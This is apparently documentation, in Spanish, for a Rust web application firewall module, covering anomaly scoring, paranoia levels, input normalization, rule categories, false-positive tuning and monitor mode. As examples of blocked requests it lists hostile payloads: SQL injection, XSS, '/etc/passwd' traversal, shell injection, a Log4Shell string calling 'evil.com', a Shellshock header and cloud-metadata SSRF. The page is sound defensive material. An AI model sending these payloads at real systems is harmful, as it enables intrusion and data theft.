---
title: Firewall de aplicaciones web (WAF)
summary: Un WAF con puntuación de anomalías que detiene inyecciones SQL, XSS, path traversal, inyección de comandos, Log4Shell, SSRF y escáneres en unos 2 µs por petición.
category: threats
order: 1
---

`Waf` es un firewall de aplicaciones web basado en firmas e inspirado en el OWASP Core Rule Set (CRS). Normaliza cada entrada para neutralizar las técnicas de evasión habituales, la compara en una sola pasada con unos cientos de firmas seleccionadas y bloquea la petición en cuanto la puntuación de anomalías acumulada alcanza un umbral. Viene incluido en todos los presets (`Shield::recommended()`, `Shield::strict()`, `Shield::api()`), así que la mayoría de las aplicaciones quedan protegidas sin escribir una sola línea de configuración.

## Amenazas que mitiga

| Categoría | Carga típica | OWASP Top 10 (2021) |
|---|---|---|
| Inyección SQL | `' OR '1'='1`, `UNION SELECT`, `WAITFOR DELAY` | A03 Injection |
| Cross-site scripting | `<script>`, `onerror=`, `javascript:` | A03 Injection |
| Path traversal / LFI | `../../etc/passwd`, `php://filter` | A01 Broken Access Control |
| Inyección de comandos del sistema | `;cat /etc/passwd`, `$(whoami)` | A03 Injection |
| Log4Shell, Spring4Shell, Shellshock | `${jndi:ldap://…}`, `() { :; };` | A06 Vulnerable and Outdated Components |
| SSRF / inclusión remota de archivos | `169.254.169.254`, `gopher://` | A10 Server-Side Request Forgery |
| Inyección NoSQL | `user[$ne]=admin` | A03 Injection |
| Inyección de plantillas en el servidor | `{{7*7}}`, `__class__` | A03 Injection |
| Sondeos de escáneres | `/.env`, `/.git/config`, `/wp-login.php` | A05 Security Misconfiguration |
| Ataques de protocolo | Inyección de cabeceras CRLF, bytes NUL | A03 Injection |

> **Atención:** un WAF es defensa en profundidad, no una corrección. Siga usando consultas parametrizadas, codificación de la salida según el contexto y una validación estricta de las entradas: las firmas reducen la superficie de ataque y le dan margen cuando se publica una vulnerabilidad, pero un atacante decidido acabará construyendo una carga que ninguna regla reconozca.

## Funcionamiento

### Puntuación de anomalías

Cada regla tiene una puntuación. Las firmas críticas como `union select` o `<script` valen 5 y bloquean por sí solas; los indicadores más débiles como `<img` (3) o `alert(` (4) solo bloquean combinados con otra coincidencia. La petición se rechaza cuando el total alcanza el umbral (5 por defecto). Cada regla cuenta una sola vez por petición, aunque coincida en varios lugares.

Una petición bloqueada recibe `403 Forbidden` con el código `waf_blocked`. La puntuación, los identificadores de regla y las categorías se registran en la pista de auditoría (consulte [los eventos de seguridad](/docs/events-stats)), pero nunca se envían al cliente.

### Qué se inspecciona

El firewall solo ve la cabecera de la petición: la ruta de la URL, la cadena de consulta y los valores de las cabeceras. Algunas cabeceras ruidosas o que transportan credenciales se omiten por defecto (`authorization`, `proxy-authorization`, `accept`, `accept-encoding`, `accept-language`, `content-length`, `content-type`, `if-none-match`, `if-modified-since`, `sec-ch-ua`, `sec-ch-ua-platform`, `sec-ch-ua-mobile`). Los cuerpos de las peticiones se inspeccionan bajo demanda desde sus handlers con `inspect_body` / `inspect_text` (ver más abajo).

### Niveles de paranoia

| Nivel | Añade | Recomendado para |
|---|---|---|
| `Paranoia::Low` (1, por defecto) | Firmas de alta fiabilidad puntuadas de 3 a 5, más las heurísticas de manejadores de eventos, comandos de shell y CRLF | Todas las aplicaciones; lo usan los presets `recommended` y `api` |
| `Paranoia::Medium` (2) | Indicadores más débiles puntuados de 1 a 3: `select * from`, `--`, `char(`, `<form`, `src=`, `127.0.0.1`, `{{`, `.php` o `.bak` en las rutas | Backoffices sensibles; lo usa el preset `strict` |
| `Paranoia::High` (3) | Indicadores muy agresivos de un solo carácter: `'`, `#`, `<`, `>`, la palabra `or`, `localhost`, `.old` | APIs internas con tráfico predecible; cuente con tener que ajustarlo |

### Normalización

Antes de buscar firmas, cada entrada pasa por los siguientes pasos, de modo que una sola firma cubre muchas formas de escribir el mismo ataque:

| Paso | Evasión neutralizada | Entrada de ejemplo | Normalizada |
|---|---|---|---|
| Decodificación de porcentajes, dos veces si hace falta | Doble codificación de URL | `%253Cscript` | `<script` |
| `+` decodificado como espacio (consulta y cuerpos) | Codificación de formularios | `1+OR+1%3D1` | `1 or 1=1` |
| Decodificación de entidades HTML (con nombre, decimales, hexadecimales) | Contrabando mediante entidades | `&lt;script&gt;`, `&#x3c;svg` | `<script>`, `<svg` |
| Eliminación de comentarios SQL, incluidos los de MySQL `/*!50000 … */` | Comentarios en línea | `UNION/**/SELECT` | `union select` |
| Secuencias de espacios en blanco reducidas a un espacio | Relleno con tabuladores y saltos de línea | `UNION%09%0A SELECT` | `union select` |
| Espacios eliminados alrededor de `;` `&` `(` `)` `=` `,` y de la barra vertical | Espaciado de operadores | `sleep (5)` | `sleep(5)` |
| Conversión a minúsculas compatible con Unicode | Mayúsculas y minúsculas mezcladas | `UnIoN SeLeCt` | `union select` |

Puede ver el resultado con `securite::waf::normalize(input, is_query)`.

### Identificadores de regla y categorías

| Identificadores | `Category` | Nombre en los registros | Ejemplos |
|---|---|---|---|
| 100–172 | `SqlInjection` | `sqli` | `union select`, `' or '1'='1`, `information_schema`, `waitfor delay` |
| 200–257 | `Xss` | `xss` | `<script`, `javascript:`, `document.cookie`, 245 = heurística de manejador de eventos `on…=` |
| 300–332 | `PathTraversal` | `traversal` | `../`, `/etc/passwd`, `php://`, `.htaccess` |
| 400–450 | `CommandInjection` | `cmdi` | `/bin/sh`, `${ifs}`, 450 = separador de shell seguido de un comando (`;cat `, `&&wget `…) |
| 500–519 | `RemoteCodeExecution` | `rce` | `${jndi:`, `class.module.classloader`, `() { :;` |
| 600–623 | `Ssrf` | `ssrf` | `169.254.169.254`, `metadata.google.internal`, `gopher://` |
| 700–714 | `NoSqlInjection` | `nosqli` | `[$ne]`, `[$where]`, `"$regex"` |
| 800–822 | `TemplateInjection` | `ssti` | `{{7*7}}`, `{{config`, `__subclasses__` |
| 900–948 | `ScannerProbe` | `scanner` | `/.env`, `/.git/`, `/wp-login.php` (solo la ruta) |
| 1000–1001 | `Protocol` | `protocol` | byte NUL, 1001 = CRLF seguido de un nombre de cabecera |
| sus identificadores | `Custom` | `custom` | reglas añadidas con `custom_rule` |

`Category` y el módulo `target` están en `securite::waf` (no forman parte del preludio). `waf.rules()` devuelve las reglas activas con su patrón, su puntuación, su nivel de paranoia y sus objetivos.

## Inicio rápido

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/search", get(|| async { "results" }))
    .layer(
        Shield::builder()
            .guard(RequestId::new())
            .guard(Waf::new())
            .build(),
    );
```

Para personalizar el firewall de un preset, añada su propio `Waf`: un guard con el mismo nombre sustituye al del preset.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    .guard(Waf::new().paranoia(Paranoia::Medium))
    .build();
```

## Configuración

| Método | Valor por defecto | Descripción |
|---|---|---|
| `Waf::new()` | paranoia `Low`, umbral 5, todas las reglas integradas | Crea el firewall (`Waf::default()` es equivalente). |
| `.paranoia(Paranoia)` | `Paranoia::Low` | Nivel de sensibilidad; los niveles superiores activan reglas más ruidosas. |
| `.threshold(u32)` | `5` | Puntuación de anomalías a partir de la cual se bloquea una petición (mínimo 1). |
| `.disable_rules(ids)` | ninguna | Desactiva reglas por identificador (cualquier `IntoIterator<Item = u16>`). |
| `.disable_category(Category)` | ninguna | Desactiva todas las reglas integradas de una categoría, heurísticas incluidas. |
| `.custom_rule(id, pattern, score, targets)` | ninguna | Añade una regla de subcadena sin distinguir mayúsculas en `Category::Custom`, activa en todos los niveles de paranoia. |
| `.skip_paths(prefixes)` | ninguno | Prefijos de ruta que no se inspeccionan en absoluto. |
| `.inspect_headers(bool)` | `true` | Inspecciona los valores de las cabeceras. |
| `.skip_headers(names)` | ver más arriba | Nombres de cabeceras que nunca se inspeccionan, añadidos a la lista por defecto. |
| `.monitor()` | bloqueo | Informa de los ataques sin bloquearlos. |

API de inspección, utilizable en cualquier parte de su código:

| Método | Devuelve | Descripción |
|---|---|---|
| `.inspect(&request::Parts)` | `Verdict` | Puntúa la cabecera de una petición exactamente como lo hace el guard. |
| `.inspect_body(&str)` | `Verdict` | Puntúa un texto cualquiera con las reglas cuyo objetivo es `BODY`. |
| `.inspect_text(&str)` | `Verdict` | Alias de `inspect_body`. |
| `.rules()` | `&[Rule]` | Las reglas activas (integradas y personalizadas). |

### Objetivos

Una regla solo se aplica a las entradas indicadas en su máscara de objetivos. Las constantes de `securite::waf::target` se combinan con el operador OR a nivel de bits:

```rust
use securite::prelude::*;
use securite::waf::target;

// target::PATH     URL path
// target::QUERY    query string
// target::HEADERS  header values
// target::BODY     text passed to inspect_body / inspect_text
// target::ARGS     everything but the path
// target::ALL      everything
let waf = Waf::new()
    // An internal codename that must never reach the application.
    .custom_rule(5000, "project-nightingale", 5, target::ALL)
    // A weak signal: only blocks when combined with another match.
    .custom_rule(5001, "debug=true", 2, target::QUERY | target::BODY);
```

## Ejemplos de cargas bloqueadas

Con la configuración por defecto (paranoia `Low`, umbral 5):

```text
GET /search?q=1' OR '1'='1                           sqli        rule 105
GET /search?q=1 UNION SELECT password FROM users     sqli        rule 100
GET /search?q=%2527%2520OR%25201%253D1               sqli        rule 103 (double-encoded)
GET /?q=<script>alert(1)</script>                    xss         rules 200, 201, 229
GET /?q=<img src=x onerror=alert(1)>                 xss         rules 212, 245, 229
GET /download?file=../../../../etc/passwd            traversal   rules 300, 302
GET /?ip=127.0.0.1|whoami                            cmdi        rule 450
GET /?x=${jndi:ldap://evil.com/a}                    rce, ssrf   rules 500, 501, 609
GET /?url=http://169.254.169.254/latest/meta-data/   ssrf        rule 600
GET /login?user[$ne]=admin                           nosqli      rule 700
GET /?name={{7*7}}                                   ssti        rule 800
GET /.env                                            scanner     rule 900
GET /?q=a%0d%0aSet-Cookie:%20x=1                     protocol    rule 1001
User-Agent: () { :; }; /bin/bash -c id               rce, cmdi   rules 516, 401
```

El tráfico normal, como `/blog/2024/10/union-of-sets-in-rust`, `/search?q=what%27s+new+in+rust`, `/?q=C%2B%2B+vs+Rust` o `/?title=Tom+%26+Jerry`, pasa sin problemas.

## Inspeccionar cuerpos en los handlers

Los guards solo ven la cabecera de la petición, así que los documentos JSON, los campos de formulario o las consultas GraphQL se inspeccionan desde sus handlers. Comparta el mismo `Waf` (clonarlo es barato) entre el escudo y el estado de su aplicación:

```rust
use axum::{extract::State, http::StatusCode, routing::post, Json, Router};
use securite::prelude::*;
use serde::Deserialize;

#[derive(Clone)]
struct AppState {
    waf: Waf,
}

#[derive(Deserialize)]
struct NewComment {
    author: String,
    text: String,
}

async fn create_comment(
    State(state): State<AppState>,
    Json(comment): Json<NewComment>,
) -> StatusCode {
    // Inspect the decoded values, not the raw JSON text.
    for field in [&comment.author, &comment.text] {
        let verdict = state.waf.inspect_text(field);
        if verdict.blocked {
            tracing::warn!(score = verdict.score, rules = ?verdict.rules, "comment rejected by the WAF");
            return StatusCode::UNPROCESSABLE_ENTITY;
        }
    }
    // ... store the comment
    StatusCode::CREATED
}

let waf = Waf::new();
let app: Router = Router::new()
    .route("/comments", post(create_comment))
    .with_state(AppState { waf: waf.clone() })
    .layer(Shield::builder().guard(waf).build());
```

Un `Verdict` expone todo lo que ha decidido el firewall:

```rust
use securite::prelude::*;
use securite::waf::{Category, Verdict};

let waf = Waf::new();
let verdict: Verdict = waf.inspect_text("1' UNION/**/SELECT password FROM users--");

assert!(verdict.blocked); // score reached the threshold
assert!(verdict.score >= 5); // total anomaly score
assert!(verdict.categories.contains(&Category::SqlInjection));
println!("score={} rules={:?}", verdict.score, verdict.rules); // score=8 rules=[143, 100]
```

> **Atención:** inspeccione los valores deserializados en lugar del cuerpo JSON en bruto. La normalización decodifica la codificación de URL y las entidades HTML, pero no los escapes de JSON: `"\u003cscript\u003e"` pasaría desapercibido en un documento en bruto, mientras que la cadena decodificada `<script>` sí se detecta.

## Ajustar los falsos positivos

Parta de la pista de auditoría: cada bloqueo registra `score=… rules=[…] categories=…`. Después aplique la corrección más acotada posible:

```rust
use securite::prelude::*;
use securite::waf::Category;

let waf = Waf::new()
    .paranoia(Paranoia::Medium)
    // Rule 157 ("--") clashes with our search syntax: `rust --unsafe`.
    .disable_rules([157])
    // Strapi-style filters such as filters[price][$gt]=10, and no MongoDB behind them.
    .disable_category(Category::NoSqlInjection)
    // Internal SQL console for DBAs, already protected by Auth and an IP allow-list.
    .skip_paths(["/admin/sql-console"])
    // Users search for code snippets, which then show up in the Referer header.
    .skip_headers(["referer"]);
```

- `disable_rules` es el bisturí: una regla, en todas partes.
- `disable_category` elimina una familia entera, para amenazas que no afectan a su stack.
- `skip_paths` desactiva el firewall para prefijos de ruta (comparados por segmentos: `/admin` cubre `/admin/users`, pero no `/administrator`). Mantenga esos prefijos lo más acotados posible y protéjalos por otros medios.
- `skip_headers` ignora cabeceras concretas; `inspect_headers(false)` las ignora todas, con lo que también renuncia a detectar cargas Log4Shell y Shellshock ocultas en `User-Agent` o `Referer`.
- `threshold` sube el listón para todas las reglas a la vez; es preferible usar las opciones anteriores.

## Despliegue progresivo en modo monitorización

En una aplicación existente, empiece en [modo monitorización](/docs/monitor-mode): no se bloquea nada, pero cada petición que se habría bloqueado se registra con nivel INFO bajo el target `securite`, se notifica a su hook `on_event` con `enforced == false` y se contabiliza en `StatsSnapshot::monitored`.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    // Same name as the preset WAF, so this one replaces it.
    .guard(Waf::new().paranoia(Paranoia::Medium).monitor())
    .on_event(|e| {
        if e.guard == "waf" && !e.enforced {
            // details look like: score=8 rules=[143, 100] categories=sqli
            tracing::info!(path = e.path, details = e.details, "the WAF would have blocked this request");
        }
    })
    .build();
```

1. Despliegue en modo monitorización y recoja un periodo de tráfico representativo (una semana laboral completa es un buen comienzo).
2. Agrupe las detecciones por identificador de regla y revíselas: ¿ataques reales o tráfico legítimo?
3. Ajuste con `disable_rules`, `skip_paths` o `skip_headers`.
4. Quite `.monitor()` y siga vigilando el contador de bloqueos.

> **Consejo:** para evaluar un nivel de paranoia más estricto mientras el actual sigue bloqueando, añada un segundo firewall en modo monitorización como capa independiente por debajo de su escudo: `router.layer(Waf::new().paranoia(Paranoia::High).monitor()).layer(shield)`. Sus detecciones se registran bajo el target de tracing `securite`.

## Uso como capa independiente

Como todos los guards, `Waf` es por sí mismo una capa de tower:

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/", get(|| async { "home" }))
    .layer(Waf::new().paranoia(Paranoia::Medium));
```

Una capa independiente construye un escudo interno con la configuración por defecto: errores en formato problem+json, IP del cliente tomada del par TCP, registro activado y sin acceso a su hook `on_event` ni a sus estadísticas. Registre el WAF en su `Shield` cuando los necesite.

## Rendimiento

Todas las firmas activas se compilan en un único autómata Aho-Corasick (DFA) al configurar el firewall. Cada entrada se normaliza una vez y se recorre en una sola pasada lineal, por lo que el coste no crece con el número de reglas. En los benchmarks del crate (`cargo bench -p securite`), inspeccionar una petición típica de navegador, con cadena de consulta y media docena de cabeceras, lleva unos 2 µs, tanto si la petición es legítima como si es maliciosa. Las cifras varían según su hardware.

La inspección de un cuerpo es lineal respecto a su tamaño: limite el tamaño de las peticiones con `BodyLimit` antes de inspeccionar documentos grandes.

## Errores comunes y consejos

- Configure el firewall una sola vez, al arrancar. Cada llamada al builder recompila el autómata; después, clonar un `Waf` es barato porque el motor compilado se comparte.
- Un `Shield` contiene un solo guard por nombre: un segundo `Waf` sustituye al primero.
- Los patrones personalizados se comparan con el texto normalizado. Escríbalos en minúsculas, con espacios simples y sin espacios alrededor de `;`, `&`, `(`, `)`, `=` y `,`; de lo contrario, nunca coincidirán.
- Elija identificadores de reglas personalizadas a partir de 5000. Reutilizar un identificador integrado hace que `disable_rules` afecte a ambas reglas, y la puntuación solo se cuenta una vez.
- `inspect_text` devuelve el veredicto en bruto: ignora el modo monitorización y `skip_paths`, no emite eventos de seguridad y no actualiza las estadísticas. Decida en su handler qué hacer y regístrelo.
- El WAF se ejecuta después de la limitación de peticiones y del bloqueador de bots, de modo que las ráfagas y los escáneres conocidos se descartan primero con comprobaciones más baratas, y antes de CSRF y de la autenticación.
- Combínelo con el [bloqueo automático](/docs/auto-ban): cada bloqueo del WAF cuenta como una penalización, y los atacantes persistentes acaban bloqueados.

## Páginas relacionadas

- [Bloqueo de bots](/docs/bot-blocker)
- [Modo monitorización](/docs/monitor-mode)
- [Eventos de seguridad y estadísticas](/docs/events-stats)
- [Formato de las respuestas de error](/docs/error-format)
- [Bloqueo automático](/docs/auto-ban)
- [Higiene HTTP](/docs/hygiene)
